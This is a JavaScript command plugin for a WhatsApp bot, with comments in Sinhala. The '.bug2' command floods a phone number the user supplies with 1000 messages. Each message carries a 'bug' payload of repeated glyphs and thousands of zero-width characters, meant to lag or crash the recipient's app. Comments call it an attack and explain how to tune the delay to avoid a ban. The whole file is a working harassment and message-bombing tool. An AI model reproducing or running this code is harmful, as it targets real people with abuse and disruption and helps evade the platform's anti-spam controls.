const { cmd } = require('../command');

cmd({
    pattern: "bug2",
    desc: "Send 1000 bug messages to a target",
    category: "owner",
    filename: __filename
},
async(conn, mek, m, { from, q, isOwner, reply }) => {
    // අයිතිකරු පමණක්දැයි පරීක්ෂා කිරීම
    if (!isOwner) return reply("DEXTER ට පමණි. 🚫");
    
    if (!q) return reply("කරුණාකර අංකය ලබා දෙන්න. \nඋදා: .spam1000 947xxxxxxxx");

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    const bugText = "1 " + "෴".repeat(500) + "\u200B".repeat(5000); // බලවත් බග් පණිවිඩය

    reply(`🚀 මැසේජ් 1000 ප්‍රහාරය ආරම්භ කළා...\n🎯 Target: ${q}`);

    // Loop එකක් මඟින් මැසේජ් 1000 යැවීම
    for (let i = 0; i < 1000; i++) {
        await conn.sendMessage(target, { text: `[${i+1}] ${bugText}` });
        
        // WhatsApp එකෙන් Ban වීම වැළැක්වීමට තත්පර 0.2 ක පොඩි විරාමයක් (Optional)
        // ඔබට වේගයෙන්ම ඕනෑ නම් පහත පේළිය ඉවත් කරන්න (හැබැයි Ban වීමේ අවදානම වැඩියි)
        await new Promise(resolve => setTimeout(resolve, 200)); 
    }

    reply("✅ මැසේජ් 1000 යවා අවසන්!");
});
